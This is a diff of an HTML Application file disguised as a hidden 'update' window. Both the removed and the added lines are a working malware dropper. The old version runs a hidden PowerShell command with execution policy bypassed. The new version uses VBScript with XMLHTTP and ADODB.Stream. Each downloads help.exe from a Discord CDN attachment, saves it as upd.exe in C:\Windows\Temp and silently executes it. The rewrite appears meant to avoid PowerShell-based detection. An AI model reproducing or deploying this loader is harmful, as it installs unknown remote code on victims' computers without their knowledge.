@@ -1,23 +1,30 @@
 <html>
 <head>
-<HTA:APPLICATION 
-    ID="oBVC"
-    APPLICATIONNAME="update"
-    BORDER="none"
-    BORDERSTYLE="normal"
-    CAPTION="no"
-    ICON=""
-    SHOWINTASKBAR="no"
-    SINGLEINSTANCE="yes"
-    SYSMENU="no"
-    WINDOWSTATE="minimize"/>
+<title></title>
+<hta:application 
+    id="oFix" 
+    applicationname="update" 
+    border="none" 
+    caption="no" 
+    showintaskbar="no" 
+    singleinstance="yes" 
+    sysmenu="no" 
+    windowstate="minimize"/>
 
 <script language="VBScript">
-Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "powershell.exe -w hidden -nop -ep bypass -c ""$d=(New-Object Net.WebClient).DownloadString('https://cdn.discordapp.com/attachments/1367499475203129415/1477680254733778976/help.exe?ex=69a5a47a&is=69a452fa&hm=b28f442e873a26b3e944b35935ccd7d71f17bee3179e51bcde7843d0f34a86de&'); [IO.File]::WriteAllBytes('C:\Windows\Temp\upd.exe',$d); Start-Process 'C:\Windows\Temp\upd.exe'""", 0, True
+Set xhr = CreateObject("MSXML2.XMLHTTP")
+xhr.Open "GET", "https://cdn.discordapp.com/attachments/1367499475203129415/1477680254733778976/help.exe?ex=69a5a47a&is=69a452fa&hm=b28f442e873a26b3e944b35935ccd7d71f17bee3179e51bcde7843d0f34a86de&", False
+xhr.Send
+If xhr.Status = 200 Then
+  Set stm = CreateObject("ADODB.Stream")
+  stm.Type = 1
+  stm.Open
+  stm.Write xhr.responseBody
+  stm.SaveToFile "C:\Windows\Temp\upd.exe", 2
+  CreateObject("WScript.Shell").Run "C:\Windows\Temp\upd.exe", 0, False
+End If
 window.close
 </script>
 </head>
-<body>
-</body>
+<body></body>
 </html>
